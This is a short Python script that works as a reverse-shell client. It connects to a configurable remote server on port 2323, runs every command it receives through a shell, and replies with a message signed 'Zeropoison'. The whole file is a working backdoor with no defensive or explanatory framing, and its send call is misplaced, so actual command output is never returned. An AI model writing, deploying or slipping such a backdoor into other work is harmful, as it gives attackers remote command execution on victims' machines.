import sys
import socket
import subprocess

SERVER_IP = ""
PORT = 2323

s=socket.socket()
s.connect((SERVER_IP, PORT))
msg = s.recv(1024).decode()
print('[*] sever:', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] Received commands: {cmd}')
    if cmd.lower() in ['quit' , 'exit' , 'q' , 'x']:
        break
    
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed Successfully by Zeropoison'.encode()
        s.send(result)


s.close()